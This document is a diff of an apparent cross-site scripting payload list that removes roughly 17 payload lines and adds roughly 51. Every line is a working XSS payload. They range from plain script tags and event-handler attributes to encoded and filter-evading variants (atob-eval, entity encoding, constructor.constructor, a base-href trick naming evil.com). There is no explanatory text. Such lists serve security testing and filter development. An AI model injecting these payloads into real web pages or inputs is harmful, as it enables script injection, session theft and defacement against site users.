@@ -1,17 +1,51 @@
-<a href="javascript:alert(1)">click</a>
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>alert`1`</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert`1`>
+<img src=x onerror=alert(1)>
+<img/src/onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<xss onpointerover=alert(1)>hover</xss>
+<math><mtext onmouseover=alert(1)>hover</mtext></math>
+<video autoplay onloadstart=alert(1)><source></video>
+<audio autoplay onloadstart=alert(1)><source></audio>
+<form><button formaction=javascript:alert(1)>click</button></form>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src=javascript:alert(1)></iframe>
 <a href=javascript:alert(1)>click</a>
-<a href="javascript:alert(1)">x</a>
-<embed src="javascript:alert(1)">
-<form action="javascript:alert(1)"><button>x</button></form>
-<img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
-"><img src=x onerror=confirm`1`>
-<math><mtext></p><script>alert(1)</script>
-<object data="javascript:alert(1)">
-<sCript>alert(1)</sCript>
-<script>eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</script>
-<script>\u0061lert(1)</script>
-<svg onload="alert(1)"//
-<svg/onload=alert(1)//
-<svg onload=alert%26%230000000040%26%230000000041>
-<svg onload=alert&#40;1&#41;>
-<svg onload=alert&#x28;1&#x29;>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<div style="xss:expression(alert(1))">
+<xss style="background:url(javascript:alert(1))">
+<xss class=cf1 id=x><!--</xss><script>alert(1)</script>-->
+<base href="javascript://evil.com/"><a href="/payload">XSS</a>
+<script>import('data:text/javascript,alert(1)')</script>
+<script>with(window)alert(1)</script>
+<script>(0,alert)(1)</script>
+<script>(1,eval)('alert(1)')</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>({}).constructor.constructor('alert(1)')()</script>
+<script>"".constructor.constructor('alert(1)')()</script>
+<script>(0).constructor.constructor('alert(1)')()</script>
+<script>true.constructor.constructor('alert(1)')()</script>
+<script>1..constructor.constructor('alert(1)')()</script>
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<script>Reflect.construct(Function,['alert(1)'])()</script>
+<script>Promise.resolve().then(()=>alert(1))</script>
+<script>queueMicrotask(()=>alert(1))</script>
+<script>requestAnimationFrame(()=>alert(1))</script>
+<script>requestIdleCallback(()=>alert(1))</script>
+<script>setTimeout(()=>alert(1),0)</script>
+<script>setInterval(()=>alert(1),0)</script>
+<script>Object.defineProperty(window,'onerror',{value:alert});throw 1</script>
